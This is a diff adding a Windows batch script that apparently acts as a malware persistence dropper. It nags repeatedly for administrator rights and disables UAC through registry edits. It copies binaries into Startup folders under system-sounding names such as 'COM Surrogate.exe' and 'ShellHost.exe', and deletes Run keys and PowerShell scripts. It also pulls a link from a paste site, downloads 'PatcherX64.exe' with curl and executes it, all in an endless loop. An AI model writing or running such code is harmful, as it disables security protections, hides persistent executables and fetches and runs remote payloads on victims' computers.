@@ -1,0 +1,221 @@
+:: ( nHBAPWtA )
+@echo off
+
+
+cd /d "%~dp0"
+
+::ShellHost.exe ---> TSSPrxySHST.exe
+::RuntimeBroker.exe ---> TSSPrxyRNTM.exe
+::COM Surrogate.exe ---> SyncHostApp.exe
+::StartupTaskCaller.exe ---> TSSPrxySTC.exe
+
+
+
+:: Check Admin Privileges
+net session >nul 2>&1
+if %errorlevel% equ 0 (
+:: Admin Granted
+goto RUNADMINHERE
+) else (
+:: Admini Not Granted
+goto loop
+)
+
+
+:loop
+timeout /t 1 /nobreak >nul
+:: Requesting Admin Privileges...
+powershell -Command "Start-Process '%~f0' -Verb RunAs"
+
+if %errorlevel% equ 0 (
+ :: Admin Granted
+goto exit
+) else ( 
+:: ( Admin Not Granted )
+    goto loop
+)
+
+:RUNADMINHERE
+:: Run All your commands here ( will be executed with admin privileges )
+
+
+:: Disable UAC 
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f
+
+
+
+:EVERYSECOND
+
+
+:SHST
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
+set "startupFile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in Startup folder.
+)
+
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+:COM
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\SyncHostApp.exe"
+set "startupFile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in Startup folder.
+)
+
+del /F /Q /A "%appdata%\*.ps1"
+reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
+reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f
+
+timeout /t 1 /nobreak >nul
+
+
+:STC
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\TSSPrxySTC.exe"
+set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+    start "" "%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"
+) else (
+    echo File is already in Startup folder.
+)
+
+
+
+
+
+
+
+
+:: Check Startup Programms , if not found Run Task , if not found task , Download STC & Run it 
+
+:: Define the list of files to check
+set "file1=%APPDATA%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"
+set "file2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
+set "file3=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
+
+
+:: Check each file
+if not exist "%file1%" goto CHECKORRUNSTC
+if not exist "%file2%" goto CHECKORRUNSTC
+if not exist "%file3%" goto CHECKORRUNSTC
+
+:: If all files are found, continue with other tasks
+echo All files found.
+goto COMMANDSFORAGENTS
+
+
+
+
+:CHECKORRUNSTC
+:: Check if "SystemCertificates" task exists
+schtasks /query /tn "SystemCertificates" >nul 2>&1
+if %errorlevel% equ 0 (
+    :: Task found, start it
+    goto CHECKSTCINSYSTEM32
+) else (
+    :: Task not found, go to STCINSTALL
+    goto STCINSTALL
+)
+
+
+:CHECKSTCINSYSTEM32
+:: Check TSSPrxySTC.exe if exist 
+if exist "%SystemRoot%\System32\TSSPrxySTC.exe" (
+    schtasks /run /tn "SystemCertificates"
+    goto COMMANDSFORAGENTS
+) else (
+    goto :STCINSTALL
+)
+
+
+
+:STCINSTALL
+:: StartupTaskCaller.exe Installer
+@echo off
+ 
+color 0A
+ 
+:loop
+ 
+:: Kill & Delete file 
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+ 
+for /f "delims=" %%i in ('curl -s https://rentry.co/opkbnm2i/raw') do set "STCFILELINK=%%i"
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%STCFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto loop
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 0.4MB (400000 bytes)
+if %FILESIZE% geq 400000 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto loop
+)
+ 
+ 
+echo Patcher Running...
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+:COMMANDSFORAGENTS
+echo Test
+
+
+
+
+goto EVERYSECOND
